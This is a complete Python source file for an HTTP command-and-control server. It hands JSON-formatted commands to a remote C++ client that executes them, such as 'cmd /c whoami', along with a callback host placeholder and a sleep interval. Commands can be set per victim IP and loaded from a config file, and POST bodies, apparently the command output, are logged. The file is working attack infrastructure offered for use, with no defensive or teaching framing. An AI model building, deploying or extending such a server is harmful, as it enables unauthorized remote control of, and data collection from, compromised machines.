#!/usr/bin/env python3
"""
Command and Control Server for Remote Command Executor
Returns JSON responses with commands for the C++ client to execute
"""
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import json
import os

class CommandControlHandler(BaseHTTPRequestHandler):
    # Command queue - can be modified to read from file or database
    COMMANDS = {
        "default": {
            "command": "cmd /c whoami",
            "next": "YOUR_SERVER_IP",
            "sleep": 30
        }
    }
    
    def _log_request(self):
        """Log incoming request details for debugging"""
        print("\n" + "=" * 60)
        print(f"Client IP      : {self.client_address[0]}")
        print(f"Client Port    : {self.client_address[1]}")
        print(f"Method         : {self.command}")
        print(f"Path           : {self.path}")
        print(f"HTTP Version   : {self.request_version}")

        parsed = urlparse(self.path)
        print(f"Parsed Path    : {parsed.path}")
        print(f"Query Params   : {parse_qs(parsed.query)}")

        print("\nHeaders:")
        for k, v in self.headers.items():
            print(f"  {k}: {v}")

        content_length = int(self.headers.get("Content-Length", 0))
        if content_length > 0:
            body = self.rfile.read(content_length)
            print("\nBody:")
            try:
                print(body.decode("utf-8"))
            except UnicodeDecodeError:
                print(body)

        print("=" * 60)

    def _get_command_for_client(self):
        """Get command configuration for the requesting client"""
        client_ip = self.client_address[0]
        
        # Check if there's a specific command for this client
        if client_ip in self.COMMANDS:
            return self.COMMANDS[client_ip]
        
        # Return default command
        return self.COMMANDS["default"]

    def _respond_json(self, data):
        """Send JSON response to client"""
        json_data = json.dumps(data)
        json_bytes = json_data.encode('utf-8')
        
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(json_bytes)))
        self.end_headers()
        self.wfile.write(json_bytes)
        
        print(f"\nResponse sent: {json_data}")

    def do_GET(self):
        """Handle GET requests - return command JSON"""
        self._log_request()
        
        # Get command for this client
        command_data = self._get_command_for_client()
        
        # Send JSON response
        self._respond_json(command_data)

    def do_POST(self):
        """Handle POST requests - could be used for command output"""
        self._log_request()
        
        # For now, just acknowledge
        self._respond_json({"status": "received"})

    def log_message(self, format, *args):
        """Disable default noisy logging"""
        return


def load_commands_from_file(filepath):
    """Load commands from a JSON configuration file"""
    if os.path.exists(filepath):
        try:
            with open(filepath, 'r') as f:
                commands = json.load(f)
                CommandControlHandler.COMMANDS.update(commands)
                print(f"Loaded commands from {filepath}")
        except Exception as e:
            print(f"Error loading commands from {filepath}: {e}")


if __name__ == "__main__":
    host = "0.0.0.0"
    port = 8080
    
    # Try to load commands from config file
    config_file = "/root/asd/commands.json"
    load_commands_from_file(config_file)
    
    print(f"Command and Control Server")
    print(f"Listening on http://{host}:{port}")
    print(f"\nDefault command configuration:")
    print(json.dumps(CommandControlHandler.COMMANDS["default"], indent=2))
    print("\nWaiting for connections...")
    
    HTTPServer((host, port), CommandControlHandler).serve_forever()
